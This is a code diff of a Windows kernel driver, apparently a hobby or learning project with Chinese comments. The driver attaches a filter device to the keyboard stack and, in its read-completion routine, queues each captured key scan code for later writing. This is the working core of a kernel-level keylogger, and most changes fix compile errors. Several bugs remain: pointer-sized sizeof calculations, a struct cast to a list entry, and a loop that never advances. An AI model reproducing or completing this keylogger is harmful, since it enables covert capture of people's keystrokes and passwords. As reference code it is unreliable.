@@ -1,6 +1,7 @@
 #include "common.h"
 #include "KHook.h"
 
+extern long g_PendingWrite ;
 NTSTATUS HookKeyboardDevice(PDRIVER_OBJECT pDriverObject)
 //创建设备，attach设备,初始化链表和互斥量
 {
@@ -12,22 +13,23 @@ NTSTATUS HookKeyboardDevice(PDRIVER_OBJECT pDriverObject)
 	
 	do{
 		RtlInitUnicodeString(&uDeviceName, wDeviceName);
-		Status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, ?, false, pHookDevice);
+		Status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, false, &pHookDevice);
 		if (!NT_SUCCESS(Status)){
 			break;
 		}
 		pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)pHookDevice->DeviceExtension;
-		Status = IoAttachDevice(pHookDevice, &uDeviceName, pKeyboardDeviceExtension->pKeyboarDevice);
+		RtlZeroMemory(pKeyboardDeviceExtension, sizeof(PDEVICE_EXTIONSION));
+		Status = IoAttachDevice(pHookDevice, &uDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
 		if (!NT_SUCCESS(Status))
 		{
 			break;
 		}
 		//???
-		pKeyboardDeviceExtension->pKeyboarDevice->Flags &= ~DO_DEVICE_INITIALIZING;
-		pKeyboardDeviceExtension->pKeyboarDevice->Flags |= (DO_BUFFERED_IO|DO_POWER_PAGABLE);
+		pKeyboardDeviceExtension->pKeyboardDevice->Flags &= ~DO_DEVICE_INITIALIZING;
+		pKeyboardDeviceExtension->pKeyboardDevice->Flags |= (DO_BUFFERED_IO|DO_POWER_PAGABLE);
 		KeInitializeSemaphore(&pKeyboardDeviceExtension->sem, 0, MAXLONG);
 		InitializeListHead(&pKeyboardDeviceExtension->MessageList);
-		KeInitializeSpinLock(&pKeyboardDeviceExtension->pkLock);
+		KeInitializeSpinLock(&pKeyboardDeviceExtension->kLock);
 		
 
 	}while(false);
@@ -55,9 +57,9 @@ NTSTATUS HookDeviceReadComplete(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID C
 {
 	PDEVICE_EXTIONSION pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)pDeviceObject->DeviceExtension;
 	PKEYBOARD_INPUT_DATA pKeyData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
-	int KeyCount = PIRP->IoStatus.Information / sizeof(PKEYBOARD_INPUT_DATA);
+	int KeyCount = pIrp->IoStatus.Information / sizeof(PKEYBOARD_INPUT_DATA);
 	int i;
-	KEY_DATA *kData = ExAllocatePool(NonPagedPool, sizeof(KEY_DATA)*KeyCount);
+	KEY_DATA *kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA)*KeyCount);
 
 	if (pKeyData->Flags==KEY_MAKE)
 	{
@@ -66,7 +68,7 @@ NTSTATUS HookDeviceReadComplete(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID C
 		{
 			kData[i].KeyData = pKeyData->MakeCode;
 			kData[i].KeyFlags = pKeyData->Flags;
-			ExInterlockedInsertTailList((PLIST_ENTRY)&kData[i],&pKeyboardDeviceExtension->MessageList,&pKeyboardDeviceExtension->pkLock);
+			ExInterlockedInsertTailList((PLIST_ENTRY)&kData[i],&pKeyboardDeviceExtension->MessageList,&pKeyboardDeviceExtension->kLock);
 			KeReleaseSemaphore(&pKeyboardDeviceExtension->sem,0,1, false);
 			g_PendingWrite++;
 		}
